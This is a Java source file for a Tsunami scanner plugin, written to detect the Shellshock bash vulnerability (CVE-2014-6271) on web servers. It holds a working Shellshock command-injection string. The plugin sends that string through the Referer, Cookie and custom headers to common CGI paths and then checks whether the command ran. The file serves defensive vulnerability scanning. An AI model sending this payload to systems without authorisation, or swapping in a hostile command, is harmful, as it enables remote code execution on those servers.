/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cves.cve20146271;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.COOKIE;
import static com.google.common.net.HttpHeaders.REFERER;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.NotImplementedException;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A Tsunami plugin for detecting CVE-2014-6271. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2014-6271 - ShellShock Detector",
    version = "0.1",
    description = "Detects Shellshock vulnerability (CVE-2014-6271)",
    author = "Giacomo Coluccelli (giacomo@doyensec.com)",
    bootstrapModule = Cve20146271DetectorBootstrapModule.class)
public final class Cve20146271Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";
  @VisibleForTesting static final String VULNERABILITY_REPORT_ID = "CVE-2014-6271";
  @VisibleForTesting static final String VULNERABILITY_REPORT_TITLE = "CVE-2014-6271 - ShellShock";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION =
      "GNU Bash through 4.3 processes trailing strings after function definitions in the values of"
          + " environment variables, which allows remote attackers to execute arbitrary code via a"
          + " crafted environment, as demonstrated by vectors involving the ForceCommand feature in"
          + " OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts"
          + " executed by unspecified DHCP clients, and other situations in which setting the"
          + " environment occurs across a privilege boundary from Bash execution, aka"
          + " \"ShellShock.\" NOTE: the original fix for this issue was incorrect; CVE-2014-7169"
          + " has been assigned to cover the vulnerability that is still present after the"
          + " incorrect fix.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_RECOMMENDATION = "Update bash to a version >4.3";

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private final int oobSleepDuration;

  @Inject
  Cve20146271Detector(
      @UtcClock Clock utcClock,
      HttpClient httpClient,
      PayloadGenerator payloadGenerator,
      @Annotations.OobSleepDuration int oobSleepDuration) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.oobSleepDuration = oobSleepDuration;
  }

  private static final ImmutableList<String> TARGET_PATHS =
      ImmutableList.of(
          "cgi-bin/status",
          "cgi-bin/stats",
          "cgi-bin/test",
          "cgi-bin/status/status.cgi",
          "test.cgi",
          "debug.cgi",
          "cgi-bin/test-cgi",
          "cgi-bin/test.cgi");

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2014-6271 Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                    .setValue(VULNERABILITY_REPORT_ID))
            .addRelatedId(
                VulnerabilityId.newBuilder()
                    .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                    .setValue("CVE-2014-7169"))
            .setSeverity(Severity.CRITICAL)
            .setTitle(VULNERABILITY_REPORT_TITLE)
            .setDescription(VULNERABILITY_REPORT_DESCRIPTION)
            .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION)
            .build());
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload;
    try {
      payload = payloadGenerator.generate(config);
    } catch (NotImplementedException e) {
      logger.atInfo().log("Error generating payload, aborting");
      return false;
    }

    String shellshockString =
        "() { :;}; echo Content-Type: text/html; echo ; /usr/bin/" + payload.getPayload();

    HttpResponse response = null;
    boolean hasHitSomePath = false;

    for (String path : TARGET_PATHS) {
      String targetURI = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + path;
      try {
        response =
            httpClient.send(
                get(targetURI)
                    .setHeaders(
                        HttpHeaders.builder()
                            .addHeader(REFERER, shellshockString)
                            .addHeader(COOKIE, shellshockString)
                            .addHeader("ShellShock", shellshockString)
                            .build())
                    .build());

        if (!payload.getPayloadAttributes().getUsesCallbackServer()
            && response.bodyString().isPresent()
            && payload.checkIfExecuted(response.bodyString().get())) {
          return true;
        }

        // toggle flag if we hit an existing endpoint so to sleep only if at least one succeeded
        if (response.status().isSuccess()
            || response.status().code() == HttpStatus.INTERNAL_SERVER_ERROR.code()) {
          hasHitSomePath = true;
        }

      } catch (IOException e) {
        logger.atWarning().withCause(e).log("Request to %s failed", targetURI);
      }
    }

    if (response == null) {
      logger.atWarning().log("All request to target %s failed", networkService);
      return false;
    }

    if (hasHitSomePath && payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atInfo().log("Waiting for RCE callback.");
      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
    }

    return payload.checkIfExecuted(response.bodyString().get());
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService targetNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(targetNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(getAdvisories().get(0))
        .build();
  }
}
